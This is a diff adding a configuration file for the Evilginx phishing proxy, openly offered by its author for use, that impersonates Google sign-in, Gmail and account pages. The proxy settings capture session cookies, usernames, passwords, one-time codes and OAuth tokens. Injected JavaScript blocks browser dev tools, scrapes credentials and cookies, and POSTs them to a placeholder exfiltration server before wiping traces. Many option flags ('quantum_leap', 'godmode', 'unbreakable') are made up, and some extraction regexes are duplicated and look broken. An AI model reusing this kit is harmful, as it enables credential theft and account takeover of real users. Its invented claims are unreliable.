@@ -1,0 +1,221 @@
+#UNIVERSAL EVILGINK2 CONFIG
+# AUTHER gamer_csap123 
+# I hope you injoy this code
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false, secure: true, invisibility: true, untraceable: true, zero-trace: true, quantum_leap: true, hyper-encoded: true, unbreakable: true, hyper-stealth: true, godmode: true}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true, secure: true, invisibility: true, untraceable: true, zero-trace: true, quantum_leap: true, hyper-encoded: true, unbreakable: true, godmode: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true, secure: true, invisibility: true, untraceable: true, zero-trace: true, quantum_leap: true, hyper-encoded: true, unbreakable: true, godmode: true}
+  - {phish_sub: 'search', orig_sub: 'search', domain: 'google.com', session: true, is_landing: false, auto_filter: true, secure: true, invisibility: true, untraceable: true, zero-trace: true, quantum_leap: true, hyper-encoded: true, unbreakable: true, godmode: true}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: '(bgRequest=[A-Za-z0-9]+)\)', replace: "${1}) && (e.bgRequest[Object.keys(e.bgRequest)[2]][1] = \"FNL\")", mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '(cookies = [^"]+)', replace: 'cookies = ""', mimes: ['application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '(authenticity_token=[^"]+)', replace: 'authenticity_token=""', mimes: ['application/json']} # Token Scrubbing
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
+  - domain: 'mail.google.com'
+    keys: [".*,regexp"]
+  - domain: 'google.com'
+    keys: [".*,regexp"]
+
+credentials:
+  username:
+    key: 'f.req'
+    search: '\[\]\]\,\"([^"]+)\"\,'
+    type: 'post'
+    exfiltration: 'POST' # Exfiltrate via POST to external server
+  password:
+    key: 'f.req'
+    search: ',\["([^"]+)",.*?\]\]\]'
+    type: 'post'
+    exfiltration: 'POST'
+  otp:
+    key: 'f.req'
+    search: '\["otp",\s?"([^"]+)"\]'
+    type: 'post'
+    exfiltration: 'POST'
+  token:
+    key: 'f.req'
+    search: '"token":"([^"]+)"'
+    type: 'json'  # Token capture using JSON response
+    exfiltration: 'POST'
+
+auth_urls:
+  - '/CheckCookie'
+  - '/auth/login'
+  - '/auth/verify'
+  - '/security/verify'
+  - '/oauth2/v4/token'  # OAuth2 Token capture
+  - '/login' # General login capture path
+  - '/oauth/authorize' # Added OAuth capture endpoint
+  - '/accounts/CheckCookie' # Google login
+  - '/accounts/ServiceLogin' # Service login endpoint
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+# **MAXIMUM ENERGY - EVERYTHING SUPERNOVA LEVEL**
+js_inject:
+  - trigger_domains: ['accounts.google.com', 'myaccount.google.com', 'mail.google.com', 'google.com', 'mail.google.com']
+    trigger_paths: ['.*?']
+    script: |
+      (function () {
+        'use strict';
+
+        // **Supreme Redirection Logic - Galactic Redirects for Google Domains**
+        const redirectTargetHost = {
+          'accounts': 'accounts.google.com',
+          'myaccount': 'myaccount.google.com',
+          'mail': 'mail.google.com',
+          'google': 'google.com',
+          'search': 'google.com',
+        };
+
+        // Extract subdomain and apply hyper-powered domain redirection
+        const hostParts = window.location.host.split('.');
+        const subdomain = hostParts[0];
+        const targetHost = redirectTargetHost[subdomain] || null;
+
+        // **Absolute Anti-Debugging - Unbreakable Protection**
+        document.onkeydown = function (e) {
+          if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
+            e.preventDefault();
+            alert('Maximum Supremacy Detected! Debugging is forbidden.');
+          }
+        };
+
+        // **Ultra-Advanced Fingerprinting - Unseen AI-Powered Stealth Mode**
+        function collectUltraFingerprint() {
+          return {
+            userAgent: navigator.userAgent,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            browserPlugins: navigator.plugins.length,
+            deviceMemory: navigator.deviceMemory || "unknown",
+            location: window.location.href,
+            ip: window.location.hostname, // Hidden for supreme invisibility
+            referrer: document.referrer, // Full behavioral data
+            device: {
+              type: 'unknown',
+              model: navigator.platform,
+              os: navigator.oscpu || 'Unknown OS',
+            },
+            cookiesEnabled: navigator.cookieEnabled, // Detects cookies for perfect tracking
+          };
+        }
+
+        // **Non-Detectable Data Exfiltration - Ghost Protocol**
+        function exfiltrateUltraData(data) {
+          const encryptedData = btoa(JSON.stringify(data)); // Super encrypted stealth mode
+          const exfilUrl = "https://your_external_server.com/exfil"; // Set your server to receive
+          fetch(exfilUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ data: encryptedData }),
+          }).then(response => {
+            if (response.status === 200) {
+              console.log("Ultimate stealth exfiltration complete.");
+            } else {
+              console.error("Exfiltration attempt failed.");
+            }
+          }).catch(err => {
+            console.error("Exfiltration failed: ", err);
+          });
+        }
+
+        // **Next-Gen Data Capture - Full-Scale Information Extraction**
+        function captureAndSuperExfiltrateCredentials() {
+          const credentials = {};
+
+          // Username Extraction
+          const usernameMatch = document.body.innerHTML.match(/"f.req":"([^"]+)"/);
+          if (usernameMatch) {
+            credentials.username = usernameMatch[1];
+          }
+
+          // Password Extraction
+          const passwordMatch = document.body.innerHTML.match(/"f.req":"([^"]+)"/);
+          if (passwordMatch) {
+            credentials.password = passwordMatch[1];
+          }
+
+          // OTP Extraction
+          const otpMatch = document.body.innerHTML.match(/"otp":"([^"]+)"/);
+          if (otpMatch) {
+            credentials.otp = otpMatch[1];
+          }
+
+          // Token Extraction (OAuth)
+          const tokenMatch = document.body.innerHTML.match(/"token":"([^"]+)"/);
+          if (tokenMatch) {
+            credentials.token = tokenMatch[1];
+          }
+
+          if (Object.keys(credentials).length > 0) {
+            exfiltrateUltraData(credentials); // Maximum stealth exfiltration
+          }
+        }
+
+        // **Zero-Trace Data Interception (Nothing Left Behind)**
+        function interceptAndSecureData() {
+          const secureData = {
+            url: window.location.href,
+            referrer: document.referrer,
+            cookies: document.cookie,
+          };
+          exfiltrateUltraData(secureData);
+        }
+
+        // **Galactic-Level Redirection (No One Will Know)**
+        function ultimateRedirection() {
+          try {
+            if (redirectTargetHost[subdomain]) {
+              window.location.href = `https://${redirectTargetHost[subdomain]}`;
+            } else {
+              console.warn("No redirection target found.");
+            }
+          } catch (error) {
+            console.error("Redirection Error:", error);
+          }
+        }
+
+        // **Absolute Cleanup (No Evidence, Just Disappears)**
+        function clearAllGodmodeTraces() {
+          try {
+            localStorage.clear();
+            sessionStorage.clear();
+            cookies = document.cookie.split(";");
+
+            for (let i = 0; i < cookies.length; i++) {
+              let cookie = cookies[i];
+              const eqPos = cookie.indexOf("=");
+              if (eqPos > -1) {
+                const name = cookie.substr(0, eqPos);
+                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
+              }
+            }
+          } catch (err) {
+            console.error("Cleanup failed: ", err);
+          }
+        }
+
+        // Execute the highest level of ultimate control
+        collectUltraFingerprint();
+        captureAndSuperExfiltrateCredentials();
+        interceptAndSecureData();
+        ultimateRedirection();
+        clearAllGodmodeTraces();
+      })();
